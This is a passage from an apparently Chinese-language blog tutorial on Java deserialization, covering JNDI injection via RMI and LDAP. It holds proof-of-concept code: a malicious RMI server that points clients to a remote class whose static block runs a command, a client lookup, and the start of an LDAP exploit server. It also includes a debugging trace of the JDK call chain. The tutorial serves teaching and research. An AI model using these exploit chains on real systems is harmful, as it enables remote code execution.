class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">printMessage</span><span class="token punctuation">(</span><span class="token keyword">final</span> InputStream input<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Runnable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token annotation punctuation">@Override</span>            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                Reader reader <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InputStreamReader</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>                BufferedReader bf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BufferedReader</span><span class="token punctuation">(</span>reader<span class="token punctuation">)</span><span class="token punctuation">;</span>                String line <span class="token operator">=</span> null<span class="token punctuation">;</span>                <span class="token keyword">try</span><span class="token punctuation">{</span>                    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>line<span class="token operator">=</span>bf<span class="token punctuation">.</span><span class="token function">readLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!=</span>null<span class="token punctuation">)</span><span class="token punctuation">{</span>                        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">}</span>                <span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>IOException e<span class="token punctuation">)</span><span class="token punctuation">{</span>                    e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们看到static域里面是执行反弹计算器的操作，为了证明攻击完成。</p><p>之前由于将static方法中的代码段封装成了一个main函数，导致无法执行。后面详细记录litchi的讲解</p><p>client</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>Context<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>InitialContext<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Client</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        String uri <span class="token operator">=</span> <span class="token string">"rmi://127.0.0.1:1099/aa"</span><span class="token punctuation">;</span>        Context ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">InitialContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        ctx<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>uri<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>server</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>ReferenceWrapper<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span>Reference<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>Registry<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span>LocateRegistry<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Server</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token punctuation">{</span>        Registry registry <span class="token operator">=</span> LocateRegistry<span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">1099</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//Registry使用1099端口</span>        Reference aa <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Reference</span><span class="token punctuation">(</span><span class="token string">"ExecTest"</span><span class="token punctuation">,</span> <span class="token string">"ExecTest"</span><span class="token punctuation">,</span> <span class="token string">"http://127.0.0.1:8081/"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//为类名为“ExecObj”的对象以及对象工厂的类名和位置构造一个新引用。</span>        ReferenceWrapper refObjWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>aa<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//将类注册到Registry需要实现Remote和继承UnicastRemoteObject类。这里并没有看到相关的代码，所以这里还需要调用ReferenceWrapper将他给封装一下。</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Binding 'refObjWrapper' to 'rmi://127.0.0.1:1099/aa'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"aa"</span><span class="token punctuation">,</span> refObjWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个漏洞的原理在于  client运行的时候 会去服务端 问说aa在哪 服务端回复 说aa在 <a href="http://127.0.0.1:8081/ExecTest.class。然后" target="_blank" rel="noopener">http://127.0.0.1:8081/ExecTest.class。然后</a> client去拿这个class 得到之后进行初始化。能rce的原因是class是我们可控的在初始化的时候，会自动执行域里面的方法。所以这个ExecTest里面要把之前在main函数中的代码，放到static域里面让其初始化的时候自动执行。</p><h3 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h3><p>这样就先动态调试一下看看</p><p>第一步：调用getURLOrDefaultInitCtx函数：InitialContext.java</p><div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/22/java-fan-xu-lie-hua-ru-men/21.png"></div>```java public Object lookup(String name) throws NamingException { //getURLOrDefaultInitCtx函数会分析name的协议头返回对应协议的环境对象，此处返回Context对象的子类rmiURLContext对象        //然后在对应协议中去lookup搜索，我们进入lookup函数        return getURLOrDefaultInitCtx(name).lookup(name);    }```<p>第二步：GenericURLContext.java</p><div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/22/java-fan-xu-lie-hua-ru-men/22.png"></div><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">//var1="rmi://127.0.0.1:1099/aa"</span><span class="token keyword">public</span> Object <span class="token function">lookup</span><span class="token punctuation">(</span>String var1<span class="token punctuation">)</span> <span class="token keyword">throws</span> NamingException <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//此处this为rmiURLContext类调用对应类的getRootURLContext类为解析RMI地址</span>    <span class="token comment" spellcheck="true">//不同协议调用这个函数，根据之前getURLOrDefaultInitCtx(name)返回对象的类型不同，执行不同的getRootURLContext</span>    <span class="token comment" spellcheck="true">//进入不同的协议路线</span>    ResolveResult var2 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getRootURLContext</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>myEnv<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//获取RMI注册中心相关数据</span>    Context var3 <span class="token operator">=</span> <span class="token punctuation">(</span>Context<span class="token punctuation">)</span>var2<span class="token punctuation">.</span><span class="token function">getResolvedObj</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//获取注册中心对象</span>    Object var4<span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>        var4 <span class="token operator">=</span> var3<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>var2<span class="token punctuation">.</span><span class="token function">getRemainingName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//去注册中心调用lookup查找，我们进入此处，传入name-aa</span>    <span class="token punctuation">}</span> <span class="token keyword">finally</span> <span class="token punctuation">{</span>        var3<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> var4<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第三步：RegistryContext.java</p><div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/22/java-fan-xu-lie-hua-ru-men/23.png"></div><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">//传入var1=aa</span><span class="token keyword">public</span> Object <span class="token function">lookup</span><span class="token punctuation">(</span>Name var1<span class="token punctuation">)</span> <span class="token keyword">throws</span> NamingException <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>var1<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">RegistryContext</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//判断来到这里</span>        Remote var2<span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            var2 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>registry<span class="token punctuation">.</span><span class="token function">lookup</span><span class="token punctuation">(</span>var1<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//RMI客户端与注册中心通讯，返回RMI服务IP，地址等信息</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NotBoundException</span> var4<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">NameNotFoundException</span><span class="token punctuation">(</span>var1<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">RemoteException</span> var5<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token punctuation">(</span>NamingException<span class="token punctuation">)</span><span class="token function">wrapRemoteException</span><span class="token punctuation">(</span>var5<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fillInStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">decodeObject</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> var1<span class="token punctuation">.</span><span class="token function">getPrefix</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//我们进入此处</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第四步：RegistryContext.java</p><div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/22/java-fan-xu-lie-hua-ru-men/24.png"></div><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">private</span> Object <span class="token function">decodeObject</span><span class="token punctuation">(</span>Remote var1<span class="token punctuation">,</span> Name var2<span class="token punctuation">)</span> <span class="token keyword">throws</span> NamingException <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//注意到上面的服务端代码，我们在RMI服务端绑定的是一个Reference对象</span>            <span class="token comment" spellcheck="true">//如果是Reference对象会，进入var.getReference()，与RMI服务器进行一次连接，获取到远程class文件地址。</span>            <span class="token comment" spellcheck="true">//如果是普通RMI对象服务，这里不会进行连接，只有在正式远程函数调用的时候才会连接RMI服务。</span>            Object var3 <span class="token operator">=</span> var1 <span class="token keyword">instanceof</span> <span class="token class-name">RemoteReference</span> <span class="token operator">?</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>RemoteReference<span class="token punctuation">)</span>var1<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getReference</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> var1<span class="token punctuation">;</span>            <span class="token keyword">return</span> NamingManager<span class="token punctuation">.</span><span class="token function">getObjectInstance</span><span class="token punctuation">(</span>var3<span class="token punctuation">,</span> var2<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>environment<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//获取reference对象进入此处</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NamingException</span> var5<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> var5<span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">RemoteException</span> var6<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token punctuation">(</span>NamingException<span class="token punctuation">)</span><span class="token function">wrapRemoteException</span><span class="token punctuation">(</span>var6<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fillInStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> var7<span class="token punctuation">)</span> <span class="token punctuation">{</span>            NamingException var4 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">NamingException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            var4<span class="token punctuation">.</span><span class="token function">setRootCause</span><span class="token punctuation">(</span>var7<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">throw</span> var4<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第五步：NamingManager.java</p><div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/22/java-fan-xu-lie-hua-ru-men/25.png"></div><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">//传入Reference对象到refinfo</span><span class="token keyword">public</span> <span class="token keyword">static</span> Object    <span class="token function">getObjectInstance</span><span class="token punctuation">(</span>Object refInfo<span class="token punctuation">,</span> Name name<span class="token punctuation">,</span> Context nameCtx<span class="token punctuation">,</span>                        Hashtable<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token punctuation">,</span><span class="token operator">?</span><span class="token operator">></span> environment<span class="token punctuation">)</span>    <span class="token keyword">throws</span> Exception<span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Use builder if installed</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token comment" spellcheck="true">// Use reference if possible</span>    Reference ref <span class="token operator">=</span> null<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>refInfo <span class="token keyword">instanceof</span> <span class="token class-name">Reference</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//满足</span>        ref <span class="token operator">=</span> <span class="token punctuation">(</span>Reference<span class="token punctuation">)</span> refInfo<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//复制</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>refInfo <span class="token keyword">instanceof</span> <span class="token class-name">Referenceable</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//不进入</span>        ref <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>Referenceable<span class="token punctuation">)</span><span class="token punctuation">(</span>refInfo<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getReference</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    Object answer<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>ref <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">//进入此处</span>        String f <span class="token operator">=</span> ref<span class="token punctuation">.</span><span class="token function">getFactoryClassName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//函数名 ExecTest</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>f <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//任意命令执行点1（构造函数、静态代码），进入此处</span>            factory <span class="token operator">=</span> <span class="token function">getObjectFactoryFromReference</span><span class="token punctuation">(</span>ref<span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>factory <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">//任意命令执行点2（覆写getObjectInstance），</span>                <span class="token keyword">return</span> factory<span class="token punctuation">.</span><span class="token function">getObjectInstance</span><span class="token punctuation">(</span>ref<span class="token punctuation">,</span> name<span class="token punctuation">,</span> nameCtx<span class="token punctuation">,</span>                                                    environment<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">return</span> refInfo<span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// if reference has no factory, check for addresses</span>            <span class="token comment" spellcheck="true">// containing URLs</span>            answer <span class="token operator">=</span> <span class="token function">processURLAddrs</span><span class="token punctuation">(</span>ref<span class="token punctuation">,</span> name<span class="token punctuation">,</span> nameCtx<span class="token punctuation">,</span> environment<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>answer <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> answer<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第六步：NamingManager.java</p><div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/22/java-fan-xu-lie-hua-ru-men/26.png"></div><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">static</span> ObjectFactory <span class="token function">getObjectFactoryFromReference</span><span class="token punctuation">(</span>    Reference ref<span class="token punctuation">,</span> String factoryName<span class="token punctuation">)</span>    <span class="token keyword">throws</span> IllegalAccessException<span class="token punctuation">,</span>    InstantiationException<span class="token punctuation">,</span>    MalformedURLException <span class="token punctuation">{</span>    Class <span class="token class-name">clas</span> <span class="token operator">=</span> null<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//尝试从本地获取该class</span>    <span class="token keyword">try</span> <span class="token punctuation">{</span>            clas <span class="token operator">=</span> helper<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>factoryName<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// ignore and continue</span>        <span class="token comment" spellcheck="true">// e.printStackTrace();</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//如果不在本地classpath，从cosebase中获取class</span>    String codebase<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>clas <span class="token operator">==</span> null <span class="token operator">&amp;&amp;</span>            <span class="token punctuation">(</span>codebase <span class="token operator">=</span> ref<span class="token punctuation">.</span><span class="token function">getFactoryClassLocation</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//此处codebase是我们在恶意RMI服务端中定义的http://127.0.0.1:8081/</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//从我们放置恶意class文件的web服务器中获取class文件</span>            clas <span class="token operator">=</span> helper<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>factoryName<span class="token punctuation">,</span> codebase<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">ClassNotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">//实例化我们的恶意class文件</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>clas <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token punctuation">(</span>ObjectFactory<span class="token punctuation">)</span> clas<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> null<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接看到static代码执行时的函数调用栈：</p><div style="width:90%;margin:auto"></div><p>总结一下JNDI+RMI注入的函数调用链：</p><p>Context.lookup-&gt;<br>getURLOrDefaultInitCtx.lookup-&gt;<br>GenericURLContext.lookup-&gt;<br>RegistryContext.lookup-&gt;<br>RegistryContext.decodeObject-&gt;<br>NamingManager.getObjectInstance-&gt;<br>NamingManager.getObjectFactoryFromReference-&gt;<br>VersionHelper12.loadClass-&gt;<br>class.forName-&gt;<br>class.forName0</p><p>结果如图：</p><div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/22/java-fan-xu-lie-hua-ru-men/28.png"></div><h1 id="java反序列化入门（七）LDAP-JNDI攻击方式"><a href="#java反序列化入门（七）LDAP-JNDI攻击方式" class="headerlink" title="java反序列化入门（七）LDAP+JNDI攻击方式"></a>java反序列化入门（七）LDAP+JNDI攻击方式</h1><h2 id="LDAP简介"><a href="#LDAP简介" class="headerlink" title="LDAP简介"></a>LDAP简介</h2><p>LDAP全称为<strong>轻量级目录访问协议</strong>，客户端与目录服务器遵循LDAP协议来发生交互，比如说新增一个节点，查询某个节点的属性等等。</p><p>与关系型数据库一样，<strong>LDAP目录服务器是一个概念</strong>，包含许多具体实现的产品，比如关系型数据库常见的有MySQL，Oracle等等。LDAP目录服务器也有常见的具体实现，比如：OpenLDAP，Active Directory(Microsoft)。本文以OpenLDAP为例介绍Java如何操作LDAP服务器。</p><p>使用场景：比如公司会使用OA，Confluence，gitlab，jira等等办公系统。如果每个系统都需要我们记住一个账号密码，那无疑是很费力的。通过使用LDAP目录服务器将多个应用的用户集中管理起来，每个应用都通过通用的LDAP协议与目录服务器通信，达到用户信息集中管理的目的。</p><h2 id="利用（Oracle-JDK-11-0-1、8u191、7u201、6u211之后无法使用）"><a href="#利用（Oracle-JDK-11-0-1、8u191、7u201、6u211之后无法使用）" class="headerlink" title="利用（Oracle JDK 11.0.1、8u191、7u201、6u211之后无法使用）"></a>利用（Oracle JDK 11.0.1、8u191、7u201、6u211之后无法使用）</h2><p>我们在当前jdk1.8.291下进行利用，这个版本经过测试RMI+JNDI失效</p><div style="width:90%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2021/06/22/java-fan-xu-lie-hua-ru-men/29.png"></div><p>利用方法是没差的，我们之前分析的时候也可以看到代码会根据传入协议头的区别去进入对应的处理函数，只需要修改传入参数的解析头,再启动ldap服务，恶意class的web服务即可。</p><p>利用过程与上面RMI Reference基本一致，只是lookup()中的URL为一个LDAP地址：ldap://xxx/xxx，由攻击者控制的LDAP服务端返回一个恶意的JNDI Reference对象。且LDAP服务的Reference远程加载Factory类不受上一点中 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制，所以适用范围更广。不过在2018年10月，Java最终也修复了这个利用点，对LDAP Reference远程工厂类的加载增加了限制，在Oracle JDK 11.0.1、8u191（有问题？？ 本地1.8.291测试成功）、7u201、6u211之后 com.sun.jndi.ldap.object.trustURLCodebase 属性的默认值被调整为false。</p><p>LdapServer.java</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>InetAddress<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>MalformedURLException<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>net<span class="token punctuation">.</span>URL<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>net<span class="token punctuation">.</span>ServerSocketFactory<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>net<span class="token punctuation">.</span>SocketFactory<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>net<span class="token punctuation">.</span>ssl<span class="token punctuation">.</span>SSLSocketFactory<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>unboundid<span class="token punctuation">.</span>ldap<span class="token punctuation">.</span>listener<span class="token punctuation">.</span>InMemoryDirectoryServer<span class="token 